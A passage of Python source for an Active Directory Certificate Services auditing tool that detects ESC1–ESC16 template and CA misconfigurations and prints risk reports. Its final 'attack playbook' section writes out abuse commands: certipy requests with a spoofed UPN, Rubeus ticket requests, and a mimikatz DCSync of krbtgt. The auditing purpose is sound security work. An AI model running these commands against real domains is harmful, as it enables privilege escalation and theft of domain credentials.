        if 'clientauthentication' in props:
            output_buffer.append(f"  Client Authentication: {props['clientauthentication']}")

        if 'nosecurityextension' in props and props['nosecurityextension']:
            output_buffer.append(
                f"{Colors.YELLOW}  No Security Extension: True [potential ESC9]{Colors.RESET}"
            )

        if 'ekus' in props:
            ekus = props['ekus']
            if ekus:
                output_buffer.append("  Extended Key Usages:")
                for eku in ekus:
                    eku_name = get_eku_name(eku)
                    if eku == "2.5.29.37.0":
                        output_buffer.append(
                            f"{Colors.YELLOW}    - {eku_name} ({eku}) [ANY PURPOSE]{Colors.RESET}"
                        )
                    elif eku == "1.3.6.1.4.1.311.20.2.1":
                        output_buffer.append(
                            f"{Colors.YELLOW}    - {eku_name} ({eku}) [ENROLLMENT AGENT]{Colors.RESET}"
                        )
                    else:
                        output_buffer.append(f"    - {eku_name} ({eku})")
            else:
                output_buffer.append(
                    f"{Colors.YELLOW}  Extended Key Usages: NONE (Any Purpose) [DANGEROUS]{Colors.RESET}"
                )

        if 'authorizedsignatures' in props:
            output_buffer.append(
                f"  Authorized Signatures Required: {props['authorizedsignatures']}"
            )

        if 'issuancepolicies' in props and props.get('issuancepolicies'):
            output_buffer.append(
                f"{Colors.YELLOW}  Issuance Policies: {props['issuancepolicies']} "
                f"[potential ESC13]{Colors.RESET}"
            )

    output_buffer.append("")


def print_analysis(principals, domain_sid_base, output_buffer):
    """Print formatted analysis of principals and rights"""
    output_buffer.append("ACCESS CONTROL LIST (ACL) ANALYSIS")
    output_buffer.append("=" * 70)

    if domain_sid_base:
        output_buffer.append(f"Domain SID Base: {domain_sid_base}")
        output_buffer.append("")

    def sort_key(item):
        sid, info = item
        friendly = get_friendly_name(sid, domain_sid_base)
        if is_low_priv_principal(friendly):
            return (0, friendly)
        elif any(x in friendly for x in ["Domain Admins", "Enterprise Admins"]):
            return (2, friendly)
        return (1, friendly)

    high_risk_rights = {
        "WriteProperty", "WriteDacl", "WriteOwner", "GenericAll",
        "GenericWrite", "Owner", "ManageCA", "ManageCertificates",
    }

    for sid, info in sorted(principals.items(), key=sort_key):
        friendly_name = get_friendly_name(sid, domain_sid_base)

        is_lp = is_low_priv_principal(friendly_name)
        is_dc = any(x in friendly_name for x in ["Domain Computers", "Domänencomputer"])
        is_du = any(x in friendly_name for x in ["Domain Users", "Domänen-Benutzer"])
        is_au = any(x in friendly_name for x in [
            "Authenticated Users", "Authentifizierte Benutzer", "Everyone", "Jeder"
        ])
        has_enroll = _has_enrollment_right(info["rights"])

        if is_dc:
            output_buffer.append(
                f"{Colors.RED}{Colors.BOLD}[!] LOW-PRIV PRINCIPAL: {friendly_name}{Colors.RESET}"
            )
            output_buffer.append(
                f"{Colors.RED}    ^ DOMAIN COMPUTERS — every domain-joined machine account "
                f"can abuse this!{Colors.RESET}"
            )
        elif is_du:
            output_buffer.append(
                f"{Colors.RED}{Colors.BOLD}[!] LOW-PRIV PRINCIPAL: {friendly_name}{Colors.RESET}"
            )
            output_buffer.append(
                f"{Colors.RED}    ^ DOMAIN USERS — every authenticated domain user "
                f"can abuse this!{Colors.RESET}"
            )
        elif is_au:
            output_buffer.append(
                f"{Colors.YELLOW}{Colors.BOLD}[!] LOW-PRIV PRINCIPAL: {friendly_name}{Colors.RESET}"
            )
            output_buffer.append(
                f"{Colors.YELLOW}    ^ {friendly_name.upper()} — broad low-privileged "
                f"access group{Colors.RESET}"
            )
        elif is_lp:
            output_buffer.append(
                f"{Colors.YELLOW}[!] LOW-PRIV PRINCIPAL: {friendly_name}{Colors.RESET}"
            )
        else:
            output_buffer.append(f"Principal: {friendly_name}")

        output_buffer.append(f"  Type: {info['type']}")
        output_buffer.append(f"  SID: {sid}")
        output_buffer.append("  Rights:")

        for right in sorted(set(info["rights"])):
            explanation = RIGHTS_EXPLANATION.get(right, "Unknown right")
            if right in high_risk_rights:
                output_buffer.append(
                    f"{Colors.YELLOW}    [!] {right}: {explanation}{Colors.RESET}"
                )
            elif right in ("Enroll", "AutoEnroll", "AllExtendedRights") and is_lp:
                output_buffer.append(
                    f"{Colors.RED}    [ENROLLMENT ALLOWED] {right}: {explanation}{Colors.RESET}"
                )
            else:
                output_buffer.append(f"    - {right}: {explanation}")

        if is_lp and has_enroll:
            output_buffer.append(
                f"{Colors.RED}  [!!!] LOW-PRIV ENROLLMENT CONFIRMED — "
                f"this principal can request certificates!{Colors.RESET}"
            )

        output_buffer.append("")


# ---------------------------------------------------------------------------
# ESC check functions
# ---------------------------------------------------------------------------

def _has_enrollment_right(rights):
    """Return True if rights include any enrollment capability"""
    return any(r in rights for r in ("Enroll", "AutoEnroll", "AllExtendedRights"))


def check_esc1(template_props, principals, domain_sid_base):
    """ESC1 - Enrollee supplies subject + client auth + no approval"""
    if not template_props:
        return False, []

    if not (
        template_props.get('enrolleesuppliessubject', False) and
        template_props.get('clientauthentication', False) and
        not template_props.get('requiresmanagerapproval', True) and
        template_props.get('enabled', False)
    ):
        return False, []

    vulnerable_principals = []
    for sid, info in principals.items():
        friendly = get_friendly_name(sid, domain_sid_base)
        if is_low_priv_principal(friendly) and _has_enrollment_right(info["rights"]):
            vulnerable_principals.append(friendly)

    vulnerable_principals = _dedup_principal_names(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc2(template_props, principals, domain_sid_base):
    """ESC2 - Any Purpose EKU or no EKU"""
    if not template_props:
        return False, []

    ekus = template_props.get('ekus', [])
    has_any_purpose = "2.5.29.37.0" in ekus or len(ekus) == 0

    if not (
        has_any_purpose and
        template_props.get('enabled', False) and
        not template_props.get('requiresmanagerapproval', True)
    ):
        return False, []

    vulnerable_principals = []
    for sid, info in principals.items():
        friendly = get_friendly_name(sid, domain_sid_base)
        if is_low_priv_principal(friendly) and _has_enrollment_right(info["rights"]):
            vulnerable_principals.append(friendly)

    vulnerable_principals = _dedup_principal_names(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc3(template_props, principals, domain_sid_base):
    """ESC3 - Certificate Request Agent EKU"""
    if not template_props:
        return False, []

    ekus = template_props.get('ekus', [])
    has_request_agent = "1.3.6.1.4.1.311.20.2.1" in ekus

    if not (
        has_request_agent and
        template_props.get('enabled', False) and
        not template_props.get('requiresmanagerapproval', True)
    ):
        return False, []

    vulnerable_principals = []
    for sid, info in principals.items():
        friendly = get_friendly_name(sid, domain_sid_base)
        if is_low_priv_principal(friendly) and _has_enrollment_right(info["rights"]):
            vulnerable_principals.append(friendly)

    vulnerable_principals = _dedup_principal_names(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc4(principals, domain_sid_base, format_type='bloodhound'):
    """ESC4 - Low-priv can modify template ACL.

    In raw ACE format, WriteProperty may be scoped to a specific attribute rather
    than all properties, which can cause false positives. GenericAll, WriteDacl,
    WriteOwner, and GenericWrite are always considered definitive regardless of format.
    """
    vulnerable_principals = []

    # Always dangerous: allow full template modification regardless of specific attribute
    definitive_rights = {"GenericAll", "GenericWrite", "WriteDacl", "WriteOwner"}
    # Potentially dangerous: write all properties, but in raw format may be attribute-specific
    potential_rights = {"WriteProperty"}

    for sid, info in principals.items():
        rights = set(info["rights"])
        friendly = get_friendly_name(sid, domain_sid_base)

        is_low_priv = is_low_priv_principal(friendly)
        is_computer = "Domain Computers" in friendly

        has_definitive = bool(rights & definitive_rights)
        has_potential = bool(rights & potential_rights)
        has_enroll = _has_enrollment_right(info["rights"])

        if (is_low_priv or is_computer) and (has_definitive or has_potential):
            dangerous_found = list((rights & definitive_rights) | (rights & potential_rights))
            # WriteProperty alone in raw format needs verification
            needs_verification = (
                has_potential and not has_definitive and format_type == 'raw'
            )
            vulnerable_principals.append({
                "name": friendly,
                "sid": sid,
                "rights": dangerous_found,
                "can_enroll": has_enroll,
                "is_definitive": has_definitive,
                "needs_verification": needs_verification,
            })

    vulnerable_principals = _dedup_dict_principals(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc5(principals, domain_sid_base):
    """ESC5 - Vulnerable PKI object ACL.

    Full ESC5 detection requires checking the CA server computer object and
    CN=Public Key Services container objects, which are not always present in
    standard BloodHound cert template dumps.
    """
    # We can only partially detect ESC5 here - flag if low-priv has dangerous rights
    # that could allow manipulation of PKI infrastructure objects
    dangerous_rights = {"GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "WriteProperty"}
    vulnerable_principals = []

    for sid, info in principals.items():
        rights = set(info["rights"])
        friendly = get_friendly_name(sid, domain_sid_base)

        if is_low_priv_principal(friendly) and bool(rights & dangerous_rights):
            vulnerable_principals.append({
                "name": friendly,
                "sid": sid,
                "rights": list(rights & dangerous_rights),
            })

    vulnerable_principals = _dedup_dict_principals(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc7(ca_principals, domain_sid_base):
    """ESC7 - Low-priv has ManageCA or ManageCertificates on CA"""
    dangerous_rights = {
        "ManageCA", "ManageCertificates", "GenericAll", "WriteProperty",
        "WriteDacl", "WriteOwner", "GenericWrite",
    }
    vulnerable_principals = []

    for sid, info in ca_principals.items():
        rights = set(info["rights"])
        friendly = get_friendly_name(sid, domain_sid_base)

        if is_low_priv_principal(friendly) and bool(rights & dangerous_rights):
            vulnerable_principals.append({
                "name": friendly,
                "sid": sid,
                "rights": list(rights & dangerous_rights),
            })

    vulnerable_principals = _dedup_dict_principals(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc9(template_props, principals, domain_sid_base):
    """ESC9 - CT_FLAG_NO_SECURITY_EXTENSION set on template.

    When this flag is set the szOID_NTDS_CA_SECURITY_EXT SID extension is not
    embedded in issued certificates. Combined with weak certificate mapping on
    domain controllers this allows certificate impersonation.

    The flag is stored as:
    - BloodHound: boolean ``nosecurityextension``
    - Certipy JSON (v4): derived boolean ``nosecurityextension`` + string list in ``enrollmentflag``
    - Certipy JSON (v5): integer list in ``enrollmentflag`` (CT_FLAG_NO_SECURITY_EXTENSION = 0x80000)
    - Certify text: boolean from field or flag name in ``enrollmentflag`` string
    """
    if not template_props:
        return False, []

    # Primary: boolean already resolved by the parser
    no_sec_ext = template_props.get('nosecurityextension', False)

    # Secondary: check raw enrollment_flag if available (BloodHound stores it directly)
    enrollment_flag = template_props.get('enrollmentflag', None)
    if enrollment_flag is not None and not no_sec_ext:
        if isinstance(enrollment_flag, int):
            no_sec_ext = bool(enrollment_flag & 0x80000)
        elif isinstance(enrollment_flag, list):
            # String list (Certipy v4) or integer list (Certipy v5)
            no_sec_ext = _certipy_flag_list_has(
                enrollment_flag, 'nosecurityextension', 0x80000
            )
        elif isinstance(enrollment_flag, str):
            # Certify text may pass the raw string value
            no_sec_ext = 'nosecurityextension' in enrollment_flag.lower().replace('_', '').replace(' ', '')

    if not (
        no_sec_ext and
        template_props.get('enabled', False) and
        not template_props.get('requiresmanagerapproval', True)
    ):
        return False, []

    vulnerable_principals = []
    for sid, info in principals.items():
        friendly = get_friendly_name(sid, domain_sid_base)
        if is_low_priv_principal(friendly) and _has_enrollment_right(info["rights"]):
            vulnerable_principals.append(friendly)

    vulnerable_principals = _dedup_principal_names(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc10(ca_props):
    """ESC10 - Weak certificate mapping at domain/CA level.

    ESC10 requires StrongCertificateBindingEnforcement < 2 on domain controllers.
    This is a domain/DC-level registry setting. Detection is limited to data present
    in the input file (typically only available from Certipy with elevated privileges).
    """
    if not ca_props:
        return False, "Data not present in input"

    # Certipy may report this as a CA property in some versions
    strong_binding = ca_props.get('strongcertificatebindingenforcemen', None)
    if strong_binding is None:
        strong_binding = ca_props.get('strongcertificatebindingenforcement', None)

    if strong_binding is None:
        return False, "StrongCertificateBindingEnforcement not found in data"

    try:
        val = int(strong_binding)
    except (ValueError, TypeError):
        return False, "Could not parse StrongCertificateBindingEnforcement value"

    if val < 2:
        mode = "Disabled (0)" if val == 0 else "Compatibility mode (1)"
        return True, mode

    return False, f"Full enforcement enabled ({val})"


def check_esc11(ca_props):
    """ESC11 - CA RPC interface does not enforce packet encryption.

    Without IF_ENFORCEENCRYPTICERTREQUEST the MS-ICPR RPC endpoint is vulnerable
    to NTLM relay attacks, similar to ESC8 but targeting the RPC interface.
    """
    if not ca_props:
        return False
    return not ca_props.get('enforceencrypticertrequest', True)


def check_esc13(template_props, principals, domain_sid_base):
    """ESC13 - OID Group Link (Issuance Policy linked to AD group).

    A certificate template with an issuance policy OID that is linked to an AD
    security group through an OID object. When a certificate with that policy OID
    is issued, Windows grants the holder effective group membership.

    Full detection requires the OID->group mapping from CN=OID,CN=Public Key Services.
    This check flags templates with issuance policies that allow low-priv enrollment.
    """
    if not template_props:
        return False, []

    issuance_policies = template_props.get('issuancepolicies', [])
    if not issuance_policies:
        return False, []

    if not (
        template_props.get('enabled', False) and
        not template_props.get('requiresmanagerapproval', True) and
        template_props.get('clientauthentication', False)
    ):
        return False, []

    vulnerable_principals = []
    for sid, info in principals.items():
        friendly = get_friendly_name(sid, domain_sid_base)
        if is_low_priv_principal(friendly) and _has_enrollment_right(info["rights"]):
            vulnerable_principals.append(friendly)

    vulnerable_principals = _dedup_principal_names(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc15(template_props, principals, domain_sid_base):
    """ESC15 / EKUwu - Schema Version 1 template with arbitrary application policy.

    Schema v1 templates do not enforce application policies from the template
    definition when processing CSRs. An attacker can specify an arbitrary EKU
    (including Client Authentication) in their CSR even if the template has no
    such EKU, bypassing template EKU restrictions.
    CVE-2024-49019
    """
    if not template_props:
        return False, []

    schema_version = template_props.get('schemaversion', 2)
    if schema_version != 1:
        return False, []

    if not (
        template_props.get('enabled', False) and
        not template_props.get('requiresmanagerapproval', True) and
        template_props.get('authorizedsignatures', 0) == 0
    ):
        return False, []

    vulnerable_principals = []
    for sid, info in principals.items():
        friendly = get_friendly_name(sid, domain_sid_base)
        if is_low_priv_principal(friendly) and _has_enrollment_right(info["rights"]):
            vulnerable_principals.append(friendly)

    vulnerable_principals = _dedup_principal_names(vulnerable_principals)
    return bool(vulnerable_principals), vulnerable_principals


def check_esc16(ca_props):
    """ESC16 - CA-level security extension disabled.

    The CA omits szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) from ALL
    issued certificates via its DisableExtensionList or equivalent CA flag.
    This is the CA-wide equivalent of ESC9 (which is per-template).
    Exploitable when StrongCertificateBindingEnforcement < 2 on DCs.
    """
    if not ca_props:
        return False
    return ca_props.get('nosecurityextension', False)


# ---------------------------------------------------------------------------
# Security assessment reporters
# ---------------------------------------------------------------------------

def assess_security(principals, domain_sid_base, template_props, output_buffer,
                    format_type='bloodhound'):
    """Assess template security and identify ESC vulnerabilities"""
    output_buffer.append("SECURITY ASSESSMENT - ESC VULNERABILITY DETECTION")
    output_buffer.append("=" * 70)

    vulnerabilities = []

    # Report Certipy-detected vulnerabilities if available
    certipy_vulns = (template_props or {}).get('certipy_vulns', {})
    if certipy_vulns:
        output_buffer.append(f"{Colors.CYAN}[i] Certipy detected vulnerabilities:{Colors.RESET}")
        for esc_id, description in certipy_vulns.items():
            output_buffer.append(f"  {esc_id}: {description}")
        output_buffer.append("")

    # ESC1
    esc1_vuln, esc1_principals = check_esc1(template_props, principals, domain_sid_base)
    if esc1_vuln:
        output_buffer.append(f"{Colors.RED}{Colors.BOLD}CRITICAL: ESC1 VULNERABILITY DETECTED!{Colors.RESET}")
        output_buffer.append("=" * 70)
        output_buffer.append("Template allows low-privileged users to specify arbitrary Subject")
        output_buffer.append("Alternative Names (SAN) and request certificates for any user.")
        output_buffer.append("  Requirements met: Enrollee Supplies Subject, Client Auth EKU,")
        output_buffer.append("  no manager approval, enabled, low-priv enrollment right.")
        output_buffer.append("Vulnerable Principals:")
        for p in esc1_principals:
            output_buffer.append(f"  - {p}")
        output_buffer.append("")
        vulnerabilities.append("ESC1")

    # ESC2
    esc2_vuln, esc2_principals = check_esc2(template_props, principals, domain_sid_base)
    if esc2_vuln:
        output_buffer.append(f"{Colors.RED}{Colors.BOLD}CRITICAL: ESC2 VULNERABILITY DETECTED!{Colors.RESET}")
        output_buffer.append("=" * 70)
        output_buffer.append("Template has 'Any Purpose' EKU or no EKU, allowing the certificate")
        output_buffer.append("to be used for any purpose including as an enrollment agent.")
        output_buffer.append("Vulnerable Principals:")
        for p in esc2_principals:
            output_buffer.append(f"  - {p}")
        output_buffer.append("")
        vulnerabilities.append("ESC2")

    # ESC3
    esc3_vuln, esc3_principals = check_esc3(template_props, principals, domain_sid_base)
    if esc3_vuln:
        output_buffer.append(f"{Colors.RED}{Colors.BOLD}CRITICAL: ESC3 VULNERABILITY DETECTED!{Colors.RESET}")
        output_buffer.append("=" * 70)
        output_buffer.append("Template has Certificate Request Agent EKU, allowing certificate")
        output_buffer.append("requests on behalf of other users without proper restrictions.")
        output_buffer.append("Vulnerable Principals:")
        for p in esc3_principals:
            output_buffer.append(f"  - {p}")
        output_buffer.append("")
        vulnerabilities.append("ESC3")

    # ESC4
    esc4_vuln, esc4_principals = check_esc4(principals, domain_sid_base, format_type)
    if esc4_vuln:
        # Use CRITICAL for definitive findings, HIGH for WriteProperty-only in raw format
        any_definitive = any(p['is_definitive'] for p in esc4_principals)
        any_unverified = any(p['needs_verification'] for p in esc4_principals)

        if any_definitive:
            output_buffer.append(
                f"{Colors.RED}{Colors.BOLD}CRITICAL: ESC4 VULNERABILITY DETECTED!{Colors.RESET}"
            )
        else:
            output_buffer.append(
                f"{Colors.YELLOW}{Colors.BOLD}HIGH: POTENTIAL ESC4 - VERIFY REQUIRED{Colors.RESET}"
            )

        output_buffer.append("=" * 70)
        output_buffer.append("Low-privileged principals can MODIFY this certificate template,")
        output_buffer.append("allowing them to reconfigure it for privilege escalation.")

        if any_unverified:
            output_buffer.append(
                f"{Colors.CYAN}  Note: WriteProperty in raw ACE format may be scoped to a specific"
                f"\n  attribute rather than all properties. Verify with Certipy or BloodHound.{Colors.RESET}"
            )

        output_buffer.append("Vulnerable Principals:")
        for p in esc4_principals:
            label = "(VERIFY)" if p['needs_verification'] else ""
            output_buffer.append(f"  Principal: {p['name']} {label}")
            output_buffer.append(f"  SID: {p['sid']}")
            output_buffer.append("  Dangerous Rights:")
            for right in p['rights']:
                output_buffer.append(f"    [X] {right}")
            if p['can_enroll']:
                output_buffer.append("  [X] Can also ENROLL (complete attack chain possible)")
            output_buffer.append("")
        vulnerabilities.append("ESC4")

    # Domain Computers warning (subset of ESC4)
    if esc4_vuln:
        computer_issues = [p for p in esc4_principals if "Domain Computers" in p.get('name', '')]
        if computer_issues:
            output_buffer.append(
                f"{Colors.YELLOW}WARNING: Domain Computers Have Dangerous Rights{Colors.RESET}"
            )
            output_buffer.append("=" * 70)
            output_buffer.append("Any compromised computer account can modify this template.")
            output_buffer.append("")

    # ESC9
    esc9_vuln, esc9_principals = check_esc9(template_props, principals, domain_sid_base)
    if esc9_vuln:
        output_buffer.append(
            f"{Colors.RED}{Colors.BOLD}HIGH: ESC9 VULNERABILITY DETECTED!{Colors.RESET}"
        )
        output_buffer.append("=" * 70)
        output_buffer.append("Template has CT_FLAG_NO_SECURITY_EXTENSION set. The SID security")
        output_buffer.append("extension (szOID_NTDS_CA_SECURITY_EXT) is NOT embedded in certificates.")
        output_buffer.append("Combined with weak DC certificate mapping this allows impersonation.")
        output_buffer.append("Requires: GenericWrite on target user + StrongCertificateBindingEnforcement < 2")
        output_buffer.append("Vulnerable Principals:")
        for p in esc9_principals:
            output_buffer.append(f"  - {p}")
        output_buffer.append("")
        vulnerabilities.append("ESC9")

    # ESC13
    esc13_vuln, esc13_principals = check_esc13(template_props, principals, domain_sid_base)
    if esc13_vuln:
        output_buffer.append(
            f"{Colors.YELLOW}{Colors.BOLD}HIGH: POTENTIAL ESC13 - OID GROUP LINK DETECTED!{Colors.RESET}"
        )
        output_buffer.append("=" * 70)
        output_buffer.append("Template contains issuance policy OIDs. If any OID is linked to a")
        output_buffer.append("privileged AD group via OID Group Link, certificate holders gain")
        output_buffer.append("effective group membership. Verify OID->group mapping manually.")
        output_buffer.append("Check: CN=OID,CN=Public Key Services,CN=Services,CN=Configuration")
        output_buffer.append("Vulnerable Principals:")
        for p in esc13_principals:
            output_buffer.append(f"  - {p}")
        output_buffer.append("")
        vulnerabilities.append("ESC13")

    # ESC15
    esc15_vuln, esc15_principals = check_esc15(template_props, principals, domain_sid_base)
    if esc15_vuln:
        output_buffer.append(
            f"{Colors.RED}{Colors.BOLD}CRITICAL: ESC15 VULNERABILITY DETECTED! (CVE-2024-49019){Colors.RESET}"
        )
        output_buffer.append("=" * 70)
        output_buffer.append("Schema Version 1 template allows specifying arbitrary Application")
        output_buffer.append("Policy (EKU) in the CSR, bypassing template EKU restrictions.")
        output_buffer.append("Attacker can request a certificate with Client Authentication EKU")
        output_buffer.append("even if the template does not define that EKU.")
        output_buffer.append("Vulnerable Principals:")
        for p in esc15_principals:
            output_buffer.append(f"  - {p}")
        output_buffer.append("")
        vulnerabilities.append("ESC15")

    if not vulnerabilities:
        output_buffer.append(f"{Colors.GREEN}No ESC Template Vulnerabilities Detected{Colors.RESET}")
        output_buffer.append("=" * 70)
        output_buffer.append("This template appears to have appropriate access controls.")
        output_buffer.append("")

    if vulnerabilities:
        output_buffer.append(
            f"{Colors.CYAN}  Tip: run with --remediation for detailed fix guidance.{Colors.RESET}"
        )
        output_buffer.append("")

    return vulnerabilities


def assess_ca_security(ca_principals, domain_sid_base, ca_props, output_buffer):
    """Assess Certificate Authority security (ESC6, ESC7, ESC8, ESC10, ESC11, ESC16)"""
    output_buffer.append("CERTIFICATE AUTHORITY SECURITY ASSESSMENT")
    output_buffer.append("=" * 70)

    vulnerabilities = []

    # ESC7
    esc7_vuln, esc7_principals = check_esc7(ca_principals, domain_sid_base)
    if esc7_vuln:
        output_buffer.append(
            f"{Colors.RED}{Colors.BOLD}CRITICAL: ESC7 VULNERABILITY DETECTED!{Colors.RESET}"
        )
        output_buffer.append("=" * 70)
        output_buffer.append("Low-privileged principals have dangerous permissions on the CA.")
        output_buffer.append("ManageCA allows enabling EDITF_ATTRIBUTESUBJECTALTNAME2 (-> ESC6).")
        output_buffer.append("ManageCertificates allows approving pending certificate requests.")
        output_buffer.append("Vulnerable Principals:")
        for p in esc7_principals:
            output_buffer.append(f"  Principal: {p['name']}")
            output_buffer.append(f"  SID: {p['sid']}")
            output_buffer.append("  Dangerous Rights:")
            for right in p['rights']:
                output_buffer.append(f"    [X] {right}")
            output_buffer.append("")
        vulnerabilities.append("ESC7")

    # ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
    if ca_props and ca_props.get('userspecifiessan', False):
        output_buffer.append(
            f"{Colors.RED}{Colors.BOLD}CRITICAL: ESC6 VULNERABILITY DETECTED!{Colors.RESET}"
        )
        output_buffer.append("=" * 70)
        output_buffer.append("EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled on this CA.")
        output_buffer.append("Any certificate request can specify an arbitrary SAN,")
        output_buffer.append("making every enrollable template vulnerable to ESC1-style attacks.")
        output_buffer.append("")
        vulnerabilities.append("ESC6")

    # ESC8 - Web enrollment
    if ca_props and ca_props.get('webenrollment', False):
        output_buffer.append(f"{Colors.YELLOW}WARNING: ESC8 Risk - Web Enrollment Enabled{Colors.RESET}")
        output_buffer.append("=" * 70)
        output_buffer.append("Web enrollment endpoint is active. Verify it enforces HTTPS and EPA")
        output_buffer.append("to prevent NTLM relay attacks against the certificate web endpoint.")
        output_buffer.append("")

    # ESC10 - Weak certificate mapping
    esc10_vuln, esc10_detail = check_esc10(ca_props)
    if esc10_vuln:
        output_buffer.append(
            f"{Colors.RED}{Colors.BOLD}HIGH: ESC10 INDICATOR - WEAK CERTIFICATE MAPPING!{Colors.RESET}"
        )
        output_buffer.append("=" * 70)
        output_buffer.append(f"StrongCertificateBindingEnforcement is in weak mode: {esc10_detail}")
        output_buffer.append("Certificates without the SID extension can still be used to authenticate.")
        output_buffer.append("This amplifies ESC9, ESC15, ESC16 and other no-SID-extension attacks.")
        output_buffer.append("")
        vulnerabilities.append("ESC10")

    # ESC11 - RPC without encryption
    if check_esc11(ca_props):
        output_buffer.append(
            f"{Colors.RED}{Colors.BOLD}HIGH: ESC11 VULNERABILITY DETECTED!{Colors.RESET}"
        )
        output_buffer.append("=" * 70)
        output_buffer.append("The CA does not enforce RPC packet encryption")
        output_buffer.append("(IF_ENFORCEENCRYPTICERTREQUEST is not set).")
        output_buffer.append("Attackers can relay NTLM authentication to the MS-ICPR RPC interface")
        output_buffer.append("and request certificates as the relayed victim account.")
        output_buffer.append("")
        vulnerabilities.append("ESC11")

    # ESC16 - CA-level security extension disabled
    if check_esc16(ca_props):
        output_buffer.append(
            f"{Colors.RED}{Colors.BOLD}HIGH: ESC16 VULNERABILITY DETECTED!{Colors.RESET}"
        )
        output_buffer.append("=" * 70)
        output_buffer.append("The CA has szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2)")
        output_buffer.append("in its DisableExtensionList. The SID security extension is omitted")
        output_buffer.append("from ALL certificates issued by this CA.")
        output_buffer.append("This is a CA-wide ESC9: every issued certificate lacks SID binding.")
        output_buffer.append("")
        vulnerabilities.append("ESC16")

    if not vulnerabilities:
        output_buffer.append(f"{Colors.GREEN}No Critical CA Vulnerabilities Detected{Colors.RESET}")
        output_buffer.append("=" * 70)
        output_buffer.append("")

    if vulnerabilities:
        output_buffer.append(
            f"{Colors.CYAN}  Tip: run with --remediation for detailed fix guidance.{Colors.RESET}"
        )
        output_buffer.append(
            f"{Colors.CYAN}  Use --attack-path ESC5 or ESC12 for PKI object / TPM notes.{Colors.RESET}"
        )
        output_buffer.append("")

    return vulnerabilities


# ---------------------------------------------------------------------------
# Attack playbook
# ---------------------------------------------------------------------------

VALID_ATTACK_PATHS = [
    'ESC1', 'ESC2', 'ESC3', 'ESC4', 'ESC5', 'ESC6', 'ESC7',
    'ESC8', 'ESC9', 'ESC11', 'ESC12', 'ESC13', 'ESC15', 'ESC16',
]


def _table_row(cols, widths, sep='|'):
    """Build a single fixed-width table row.

    Handles ANSI color codes correctly: the visible length is measured after
    stripping escape sequences, but the full colored string is emitted.
    """
    _ansi = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')

    def pad_col(text, w):
        visible = _ansi.sub('', str(text))
        # Truncate visible content if too long
        if len(visible) > w:
            # Rebuild truncated version without breaking mid-escape
            plain = Colors.strip_colors(str(text))[:w]
            return f" {plain:<{w}} "
        padding = w - len(visible)
        return f" {text}{' ' * padding} "

    parts = [pad_col(c, w) for c, w in zip(cols, widths)]
    return sep + sep.join(parts) + sep


def _table_divider(widths, sep='|', fill='-'):
    """Build a table divider row."""
    parts = [fill * (w + 2) for w in widths]
    return sep + sep.join(parts) + sep


def _guess_domain(principal_str):
    """Guess the FQDN domain from a DOMAIN\\User string or 'Domain Users' style name."""
    if '\\' in principal_str:
        netbios = principal_str.split('\\', 1)[0]
        # Treat dots as FQDN already (e.g. AD.TMR.NET)
        if '.' in netbios:
            return netbios.lower()
    return '<DOMAIN>'


def _attack_cmd(label, *cmd_lines):
    """Return a labeled command block as a list of lines."""
    result = [f"  [{label}]"]
    for line in cmd_lines:
        result.append(f"    {line}")
    result.append("")
    return result


def _esc_commands(esc_id, ca_name="<CA>", ca_host="<CA-HOST>",
                  domain="<DOMAIN>", template_name="<TEMPLATE>"):
    """
    Return formatted output lines for the abuse techniques of a specific ESC.
    Values are substituted from scan data or left as generic placeholders
    in standalone mode (no input file).
    """
    esc_id = esc_id.upper()
    out = []

    def hdr(title):
        out.append(f"{Colors.CYAN}{Colors.BOLD}{esc_id} - {title}{Colors.RESET}")
        out.append("-" * 70)

    def cmd(label, *lines):
        out.extend(_attack_cmd(label, *lines))

    if esc_id == "ESC1":
        hdr("Subject Alternative Name Specification")
        out.append(f"  Template : {template_name}")
        out.append("  Low-priv user specifies an arbitrary UPN/SAN in the CSR.")
        out.append("")
        cmd("Linux - Certipy",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' \\",
            f"  -ca '{ca_name}' -target '{ca_host}' \\",
            f"  -template '{template_name}' -upn '<TARGET>@{domain}' -dc-ip '<DC-IP>'",
            "",
            "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'")
        cmd("Windows - Certify + Rubeus",
            f"Certify.exe request /ca:'{ca_host}\\{ca_name}' /template:'{template_name}' /altname:'<TARGET>'",
            "",
            "# Convert PEM to PFX:",
            "openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx",
            "",
            f"Rubeus.exe asktgt /user:<TARGET> /certificate:cert.pfx /password:'' /domain:{domain} /dc:<DC-IP> /ptt",
            "",
            "# DCSync with obtained TGT:",
            f"mimikatz# lsadump::dcsync /domain:{domain} /user:krbtgt")

    elif esc_id == "ESC2":
        hdr("Any Purpose EKU Abuse")
        out.append(f"  Template : {template_name}")
        out.append("  Get Any-Purpose cert, use as enrollment agent to request a DA cert.")
        out.append("")
        cmd("Linux - Certipy (two-step)",
            "# Step 1: get Any-Purpose certificate",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' -template '{template_name}'",
            "",
            "# Step 2: request cert on behalf of DA using the Any-Purpose cert",
            f"certipy req -u '<USER>@{domain}' -p '<PASS>' -ca '{ca_name}' -target '{ca_host}' \\",
            f"  -template 'User' -on-behalf-of '{domain}\\<TARGET>' -pfx user.pfx",
            "",
            "certipy auth -pfx '<TARGET>.pfx' -dc-ip '<DC-IP>'")

    elif esc_id == "ESC3":
        hdr("Certificate Request Agent EKU")
        out.append(f"  Template : {template_name}")
